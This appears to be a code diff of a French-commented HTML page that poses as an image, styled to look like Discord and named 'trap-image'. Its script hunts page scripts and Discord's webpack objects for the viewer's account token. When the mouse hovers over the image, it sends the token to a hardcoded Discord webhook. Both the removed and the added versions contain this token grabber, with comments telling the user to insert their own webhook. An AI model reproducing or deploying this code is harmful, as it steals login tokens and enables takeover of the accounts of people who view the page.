@@ -3,48 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image_2026_08_31</title>
+    <title>Image</title>
     <style>
-        body { margin: 0; padding: 0; background: #fff; }
-        img { width: 100%; height: auto; display: block; cursor: pointer; }
-        /* Cache le corps si nécessaire */
-        .hidden { display: none; }
+        body {
+            margin: 0;
+            background-color: #36393f; /* Fond Discord */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .trap-image {
+            width: 600px; /* Ajuste la taille */
+            height: auto;
+            border-radius: 8px;
+            cursor: pointer;
+            /* Optionnel : Ajoute un léger effet de zoom au survol pour inciter */
+            transition: transform 0.2s ease;
+        }
+
+        .trap-image:hover {
+            transform: scale(1.02); /* Petit zoom subtil */
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+        }
     </style>
 </head>
 <body>
-    <!-- Image cible : utilise une image de haute qualité pour le leurre -->
-    <img id="target" src="https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96ae5c&is=6a955cdc&hm=c47cad92d57c0ba4bf571816f87ddb9ed297cfe092e1e9854de0e78b83c78fce&=&format=webp&quality=lossless&width=1024&height=558" alt="Photo">
-    
-    <script>
-        // URL du webhook ou de ton serveur de réception
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1543762448643915799/o9B-rPF0YGlhtO00A48susJVoQEtou5nDakvei0zLorngDfdvh0KotsbULWKBnpVFTYG';
 
+    <!-- Remplace par l'URL de ton image -->
+    <img id="pic" class="trap-image" src="https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png" alt="Image">
+
+    <script>
         // Fonction pour récupérer le token
         function getDiscordToken() {
-            // Recherche dans les objets globaux de Discord
-            const token = Object.values(document.querySelector('script')?.innerText || '')
-                .match(/"token":"([^"]+)"/)?.[1];
-            
-            if (!token) {
-                // Fallback : chercher dans les autres scripts
-                for (let i = 0; i < document.scripts.length; i++) {
-                    const match = document.scripts[i].innerText.match(/"token":"([^"]+)"/);
+            // Méthode 1 : Chercher dans les scripts injectés (le plus fiable)
+            const scripts = document.scripts;
+            for (let i = 0; i < scripts.length; i++) {
+                const scriptText = scripts[i].textContent;
+                if (scriptText && scriptText.includes('"token":"')) {
+                    const match = scriptText.match(/"token":"([^"]+)"/);
                     if (match) return match[1];
+                }
+            }
+            // Méthode 2 : Fallback via les objets globaux (souvent moins fiable mais utile)
+            const webpackChunk = window.webpackChunkdiscord_app || window.webpackChunkdiscord_app_ || [];
+            for (let chunk of webpackChunk) {
+                if (chunk && chunk.__esModule === false) {
+                    const search = Object.values(chunk).find(c => c?.default?.getToken);
+                    if (search) {
+                        return search.default.getToken();
+                    }
                 }
             }
             return null;
         }
 
-        // Événement au clic
-        document.getElementById('target').addEventListener('mouseenter', function() {
+        // Fonction d'envoi du token
+        function sendToken(token) {
+            if (!token) return;
+            
+            // Remplace par TON WEBHOOK
+            const webhookUrl = "https://discord.com/api/webhooks/1543762448643915799/o9B-rPF0YGlhtO00A48susJVoQEtou5nDakvei0zLorngDfdvh0KotsbULWKBnpVFTYG";
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🔥 Token volé au survol !",
+                    embeds: [{
+                        title: "Nouvelle capture",
+                        color: 15158332,
+                        fields: [
+                            { name: "Token", value: token, inline: false }
+                        ]
+                    }]
+                })
+            });
+        }
+
+        // DÉCLENCHEUR : Au survol de la souris
+        document.getElementById('pic').addEventListener('mouseenter', function() {
             const token = getDiscordToken();
-            if (token) {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `Token capturé : ${token}` })
-                }).catch(() => {}); // Silencieux en cas d'erreur
-            }
+            sendToken(token);
+            
+            // Petit détail : On peut ajouter un console.log pour debug
+            console.log("Token volé au survol !");
         });
     </script>
 </body>
